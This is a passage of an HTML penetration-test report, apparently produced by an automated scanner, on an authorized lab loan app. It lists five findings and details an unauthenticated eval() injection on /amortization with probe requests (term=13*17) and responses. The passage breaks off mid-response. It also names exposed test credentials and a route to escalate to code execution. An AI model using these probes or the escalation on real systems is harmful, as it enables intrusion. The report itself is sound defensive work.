@@ -1,0 +1,2993 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr319l42-lf9r91</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] Unauthenticated Python eval() code injection via term on /amortization</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [price-tampering] Loan terms fully client-editable via profile update (price/terms tampering)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#d32f2f">HIGH</span> [price-tampering] Multi-step price tampering: borrower rewrites loan principal via /profile → authoritative /loan_details record</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#f57c00">MEDIUM</span> [secret-exposure] Valid credentials (test:test) disclosed in login page HTML comment</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#c9a227">LOW</span> [rate-limit] No rate limiting or account lockout on /login (brute-force enabled)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr319l42-lf9r91</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32836</code></td></tr>
+<tr><td>Started</td><td>2026-07-02T04:57:38.896Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>6 mapped · 6 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>5</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32836</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>5 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">2</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">1</b> low</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] Unauthenticated Python eval() code injection via term on /amortization</h3>
+<div class="kv">Screen: <code>s-0005</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32836</div>
+<div class="desc">GET /amortization passes the term query parameter to Python eval() as the loop bound (one table row per unit), so term is evaluated server-side rather than cast to int. Evidence: term=7*7 gives 49 rows, term=8*8 gives 64 rows, term=2 exponent 8 gives 256 rows; term=13*17 gives 221 rows with 221 as the final payment number while control term=7 gives 7 rows without 221; term=abc gives 500 NameError proving evaluation; stripped builtins (pow, ord, import of os all 500 NameError); and the int-literal dunder-add call gives 41 rows (ev-mr32bdfy-42), proving dunder method calls on literals execute, which is the CPython eval-sandbox-escape primitive reaching os/subprocess, so arbitrary RCE is achievable. A brace blocklist (400 forbidden characters) stops Jinja-style SSTI but not raw Python. The endpoint needs no authentication: blanked cookie/authorization still returns 200 evaluated output (ev-mr324sai-3g, ev-mr325tji-3i) whereas /profile redirects to /login (ev-mr325udc-3k). Impact: unauthenticated arbitrary code execution; secondary DoS via unbounded exponent.
+
+[+] Also observed as &quot;Blind SSTI → RCE on /amortization `term` (brace-filter + non-reflected output bypass)&quot;.</div>
+<div><b>Reproduction</b></div><pre>Unauthenticated. Baseline GET /amortization with principal=10000 term=7 rate=5 returns 200 with 7 rows and no marker 221. Attack: term=13*17 returns 200 with 221 rows and product 221 as the final payment number, repeated identically. term=abc returns 500 NameError proving eval. term set to the int dunder-add call returns 41 rows proving method execution. Works with cookie and authorization blanked; /profile with the same blanked headers returns 302 to login. Fix: use int(term) with an upper bound, never eval.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr32de38-45</code> — <code>artifacts/s-0005/ev-mr32de38-45/</code></div><div class="lbl">REQUEST</div><pre>GET /amortization?principal=10000&amp;term=7&amp;rate=5 HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1904
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:28:35 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Amortization Table&lt;/title&gt;
+    &lt;i&gt;This feature is not yet fully implented.&lt;/i&gt;
+    &lt;style&gt;
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid black;
+            padding: 8px;
+            text-align: center;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;Amortization Table&lt;/h2&gt;
+    &lt;table id=&quot;paymentTable&quot;&gt;
+        &lt;thead&gt;
+            &lt;tr&gt;
+                &lt;th&gt;Payment Number&lt;/th&gt;
+                &lt;th&gt;Principal&lt;/th&gt;
+                &lt;th&gt;Interest&lt;/th&gt;
+            &lt;/tr&gt;
+        &lt;/thead&gt;
+        &lt;tbody&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;1&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;2&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;3&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;4&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;5&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;6&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;7&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+        &lt;/tbody&gt;
+    &lt;/table&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr32df5y-46</code> — <code>artifacts/s-0005/ev-mr32df5y-46/</code></div><div class="lbl">REQUEST</div><pre>GET /amortization?principal=10000&amp;term=13*17&amp;rate=5 HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE (truncated)</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 34980
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:28:37 GMT
+expires: 0
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Amortization Table&lt;/title&gt;
+    &lt;i&gt;This feature is not yet fully implented.&lt;/i&gt;
+    &lt;style&gt;
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid black;
+            padding: 8px;
+            text-align: center;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;Amortization Table&lt;/h2&gt;
+    &lt;table id=&quot;paymentTable&quot;&gt;
+        &lt;thead&gt;
+            &lt;tr&gt;
+                &lt;th&gt;Payment Number&lt;/th&gt;
+                &lt;th&gt;Principal&lt;/th&gt;
+                &lt;th&gt;Interest&lt;/th&gt;
+            &lt;/tr&gt;
+        &lt;/thead&gt;
+        &lt;tbody&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;1&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;2&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;3&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;4&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;5&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;6&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;7&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;8&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;9&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;10&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;11&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;12&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;13&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;14&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;15&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;16&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;17&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;18&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;19&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;20&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;21&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;22&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;23&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;24&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;25&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;26&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;27&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;28&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;29&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;30&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;31&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;32&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;33&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;34&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;35&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;36&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;37&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;38&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;39&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;40&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;41&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;42&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;43&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;44&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;45&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;46&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;47&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;48&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;49&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;50&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;51&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;52&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;53&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;54&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;55&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;56&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;57&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;58&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;59&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;60&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;61&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;62&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;63&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;64&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;65&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;66&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;67&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;68&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;69&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;70&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;71&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;72&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;73&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;74&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;75&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;76&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;77&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;78&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;79&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;80&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;81&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;82&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;83&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;84&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;85&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
